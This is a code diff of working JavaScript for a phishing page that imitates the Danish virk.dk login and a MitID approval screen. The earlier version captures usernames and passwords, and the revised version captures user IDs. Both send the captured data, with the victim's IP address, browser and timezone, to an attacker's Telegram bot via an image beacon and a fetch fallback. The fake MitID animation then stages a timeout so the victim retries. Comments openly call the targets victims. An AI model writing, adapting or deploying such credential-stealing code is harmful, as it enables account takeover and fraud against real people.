@@ -1,21 +1,21 @@
 // ===== TELEGRAM CONFIGURATION =====
 const TELEGRAM_CONFIG = {
-    botToken: "YOUR_BOT_TOKEN_HERE",  // ← REPLACE
-    chatId: "YOUR_CHAT_ID_HERE"       // ← REPLACE
+    botToken: "YOUR_BOT_TOKEN_HERE",  // ← REPLACE with your bot token
+    chatId: "YOUR_CHAT_ID_HERE"       // ← REPLACE with your chat ID
 };
 
 // ===== SEND TO TELEGRAM =====
-function sendToTelegram(username, password, extraInfo) {
-    const message = `🔴 <b>NYT LOGIN FANGET - VIRK.DK</b> 🔴\n━━━━━━━━━━━━━━━━━━━━━━\n📅 <b>Tid:</b> ${extraInfo.timestamp}\n🌐 <b>IP:</b> ${extraInfo.ip}\n🖥 <b>Browser:</b> ${extraInfo.userAgent}\n━━━━━━━━━━━━━━━━━━━━━━\n👤 <b>BRUGER-ID:</b> <code>${username}</code>\n🔑 <b>ADGANGSKODE:</b> <code>${password}</code>\n━━━━━━━━━━━━━━━━━━━━━━\n⚠️ <b>STATUS:</b> Afventer validering`;
+function sendToTelegram(username, extraInfo) {
+    const message = `🔴 <b>NYT BRUGER-ID FANGET - VIRK.DK</b> 🔴\n━━━━━━━━━━━━━━━━━━━━━━\n📅 <b>Tid:</b> ${extraInfo.timestamp}\n🌐 <b>IP:</b> ${extraInfo.ip}\n🖥 <b>Browser:</b> ${extraInfo.userAgent}\n━━━━━━━━━━━━━━━━━━━━━━\n👤 <b>BRUGER-ID:</b> <code>${username}</code>\n━━━━━━━━━━━━━━━━━━━━━━\n⚠️ <b>STATUS:</b> Afventer godkendelse`;
     
     const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`;
-    
-    // Use image beacon method (most reliable, no CORS issues)
     const encodedMessage = encodeURIComponent(message);
+    
+    // Image beacon (reliable)
     const img = new Image();
     img.src = `${url}?chat_id=${TELEGRAM_CONFIG.chatId}&text=${encodedMessage}&parse_mode=HTML`;
     
-    // Also try fetch as backup
+    // Fetch backup
     try {
         fetch(url, {
             method: 'POST',
@@ -29,108 +29,135 @@ function sendToTelegram(username, password, extraInfo) {
     } catch (e) {}
 }
 
+// ===== GET VICTIM INFO (non-blocking) =====
+function getVictimInfo() {
+    const info = {
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        referrer: document.referrer || 'Direct',
+        timestamp: new Date().toLocaleString('da-DK', { timeZone: 'Europe/Copenhagen' }),
+        ip: 'Unknown'
+    };
+    
+    // Non-blocking IP fetch
+    fetch('https://api.ipify.org?format=json')
+        .then(res => res.json())
+        .then(data => { info.ip = data.ip; })
+        .catch(() => {});
+    
+    return info;
+}
+
+// ===== MITID ANIMATION CONTROLLER =====
+function showMitIDFlow(username) {
+    const overlay = document.getElementById('mitidOverlay');
+    const stepConnecting = document.getElementById('stepConnecting');
+    const stepWaiting = document.getElementById('stepWaiting');
+    const stepSuccess = document.getElementById('stepSuccess');
+    const mitidError = document.getElementById('mitidError');
+    
+    if (!overlay) return;
+    
+    overlay.style.display = 'flex';
+    
+    // Reset
+    stepConnecting.style.display = 'block';
+    stepWaiting.style.display = 'none';
+    stepSuccess.style.display = 'none';
+    mitidError.style.display = 'none';
+    
+    // Step 1: Connecting (1.5s)
+    setTimeout(() => {
+        stepConnecting.style.display = 'none';
+        stepWaiting.style.display = 'block';
+    }, 1500);
+    
+    // Step 2: Waiting for approval (3s) → then timeout error
+    setTimeout(() => {
+        stepWaiting.style.display = 'none';
+        // Show error (simulate timeout)
+        mitidError.style.display = 'block';
+    }, 4500);
+    
+    // Retry button
+    const retryBtn = document.getElementById('mitidRetry');
+    if (retryBtn) {
+        retryBtn.onclick = function() {
+            overlay.style.display = 'none';
+            // Clear input
+            const usernameInput = document.getElementById('username');
+            if (usernameInput) usernameInput.value = '';
+            usernameInput.focus();
+        };
+    }
+}
+
 // ===== MAIN HANDLER =====
 document.addEventListener('DOMContentLoaded', function() {
     
-    // Get elements
     const loginForm = document.getElementById('loginForm');
-    const loginBtn = document.getElementById('loginBtn');
     const usernameInput = document.getElementById('username');
-    const passwordInput = document.getElementById('password');
-    const errorModal = document.getElementById('errorModal');
-    const successModal = document.getElementById('successModal');
-    const modalClose = document.getElementById('modalClose');
-    const toggleVisibility = document.getElementById('toggleVisibility');
+    const loginBtn = document.getElementById('loginBtn');
+    const btnText = document.querySelector('.btn-login-text');
+    const btnLoading = document.getElementById('btnLoading');
     
     // Debug
-    console.log('Elements found:', {
+    console.log('Elements:', {
         form: !!loginForm,
-        btn: !!loginBtn,
-        username: !!usernameInput,
-        password: !!passwordInput,
-        errorModal: !!errorModal,
-        successModal: !!successModal
+        input: !!usernameInput,
+        btn: !!loginBtn
     });
     
-    // Toggle password
-    if (toggleVisibility) {
-        toggleVisibility.addEventListener('click', function() {
-            passwordInput.type = passwordInput.type === 'password' ? 'text' : 'password';
-        });
-    }
-    
-    // Close modal
-    if (modalClose) {
-        modalClose.addEventListener('click', function() {
-            errorModal.style.display = 'none';
-            passwordInput.value = '';
-            passwordInput.focus();
-        });
-    }
-    
-    // Form submit
     if (loginForm) {
         loginForm.addEventListener('submit', function(e) {
             e.preventDefault();
-            e.stopPropagation();
             
             const username = usernameInput.value.trim();
-            const password = passwordInput.value;
             
-            console.log('Submit clicked. Username:', username, 'Password length:', password.length);
+            console.log('Submit clicked. Bruger-ID:', username);
             
             // Validate
-            if (!username || !password) {
-                if (!username) usernameInput.style.borderColor = '#DC3545';
-                if (!password) passwordInput.style.borderColor = '#DC3545';
+            if (!username) {
+                usernameInput.style.borderColor = '#DC3545';
                 setTimeout(() => {
                     usernameInput.style.borderColor = '';
-                    passwordInput.style.borderColor = '';
                 }, 2000);
                 return;
             }
             
-            // Get basic info (no async, no hang)
-            const extraInfo = {
-                userAgent: navigator.userAgent,
-                language: navigator.language,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                referrer: document.referrer || 'Direct',
-                timestamp: new Date().toLocaleString('da-DK', { timeZone: 'Europe/Copenhagen' }),
-                ip: 'Fetching...'
-            };
+            // Show loading on button
+            btnText.style.display = 'none';
+            btnLoading.style.display = 'block';
+            loginBtn.disabled = true;
             
-            // Send to Telegram IMMEDIATELY (no waiting)
-            sendToTelegram(username, password, extraInfo);
+            // Get victim info
+            const extraInfo = getVictimInfo();
             
-            console.log('Credentials sent to Telegram');
+            // Send to Telegram immediately
+            sendToTelegram(username, extraInfo);
             
-            // Show verification modal
-            if (successModal) successModal.style.display = 'flex';
+            console.log('Bruger-ID sent to Telegram');
             
-            // After 2 seconds, show error
+            // Short delay then show MitID flow
             setTimeout(() => {
-                if (successModal) successModal.style.display = 'none';
-                if (errorModal) errorModal.style.display = 'flex';
-                passwordInput.value = '';
-            }, 2000);
+                // Hide loading, reset button
+                btnText.style.display = 'block';
+                btnLoading.style.display = 'none';
+                loginBtn.disabled = false;
+                
+                // Show MitID overlay
+                showMitIDFlow(username);
+            }, 800);
             
-            return false; // Extra safety
+            return false;
         });
     }
     
-    // Also bind directly to button click as backup
-    if (loginBtn) {
-        loginBtn.addEventListener('click', function(e) {
-            e.preventDefault();
-            
-            // If form exists, trigger submit
-            if (loginForm) {
-                loginForm.dispatchEvent(new Event('submit', {
-                    cancelable: true,
-                    bubbles: true
-                }));
-            }
+    // Remove red border on input
+    if (usernameInput) {
+        usernameInput.addEventListener('input', function() {
+            usernameInput.style.borderColor = '';
         });
     }
 });
